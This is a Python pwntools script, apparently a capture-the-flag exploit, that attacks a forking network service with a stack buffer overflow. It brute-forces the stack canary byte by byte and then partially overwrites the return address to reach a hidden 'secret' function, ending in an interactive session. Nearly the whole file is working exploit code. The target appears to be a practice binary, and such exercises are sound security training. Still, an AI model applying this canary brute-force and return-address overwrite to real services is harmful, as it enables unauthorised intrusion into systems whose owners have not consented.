
from pwn import *
import time

binary_name = "./pwn"

context.terminal = ['tmux','splitw','-h']

#p = process(binary_name)
p = remote("0.0.0.0", "4337")

elf = ELF(binary_name)

secret_offset = elf.symbols["secret"]
log.info(hex(secret_offset))

win_string = b"You found the secret!"

# p = gdb.debug('./pwn1', """
#     break main
#     break vuln
#     c
#     c
# """)
# time.sleep(5)


print(p.clean().decode())

canary = b"\x00"

brute_canary = log.progress('bruteforcing canary..')
for i in range(7):
    for j in range(256):
        brute_canary.status(f'bruteforcing canary: {i} byte: char: {j}')
        p.writeline(b"y")
        buf = b"A"*32 + b"B"*8 + canary + (b"%c" % j)
        p.sendafter("Please provide an input\n", buf)
        resp = p.readuntil(b"Should I make you another fork?")
        if b"feeew" not in resp:
            canary += b"%c" % j
            log.info(f"canary: {repr(canary)}")
            break
brute_canary.success(f'canary: {repr(canary)}')

brute_offset = log.progress('bruteforcing secret()..')
for i in range(16):
    p.writeline(b"y")
    buf = b"A"*32 + b"B"*8 + canary + b"C"*8 + p16((secret_offset & 0x0fff) + 0x1000*i)
    p.write(buf)
    resp = p.readuntil(b"Should I make you another fork?")
    if win_string in resp:
        log.info(f"found offset: {hex((secret_offset & 0x0fff) + 0x1000*i)})")
        brute_offset.success(resp)
        break

p.interactive()
